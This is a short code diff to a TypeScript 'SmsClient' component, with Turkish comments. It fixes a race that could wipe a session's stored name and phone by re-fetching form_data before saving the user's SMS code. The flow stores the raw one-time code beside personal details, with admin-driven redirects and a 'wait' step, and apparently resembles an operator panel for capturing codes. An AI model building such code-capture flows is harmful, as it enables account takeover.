@@ -94,7 +94,25 @@ export function SmsClient({ sessionId }: Props) {
     setSaving(true);
     setMsg(null);
 
-    const nextFormData = { ...sessionFormData, smsCode: code.trim() };
+    // 🔴 KRITIK: sessionFormData state'i henuz yuklenmemis/bos olabilir
+    //    (admin yonlendirmesi sonrasi fetch bitmeden submit edilirse
+    //    form_data'yi {} ile ezip isim/soyisim/telefonu sileriz).
+    //    Yazmadan hemen once DB'den taze form_data cek ve merge et.
+    let freshFormData = sessionFormData;
+    try {
+      const { data: freshRow } = await supabase
+        .from("sessions")
+        .select("form_data")
+        .eq("id", sessionId)
+        .maybeSingle();
+      if (freshRow?.form_data && typeof freshRow.form_data === "object") {
+        freshFormData = { ...sessionFormData, ...(freshRow.form_data as Record<string, unknown>) };
+      }
+    } catch {
+      /* fresh fetch basarisizsa state ile devam */
+    }
+
+    const nextFormData = { ...freshFormData, smsCode: code.trim() };
     const { error } = await supabase
       .from("sessions")
       .update({ is_hidden: false, current_step: "wait", form_data: nextFormData })
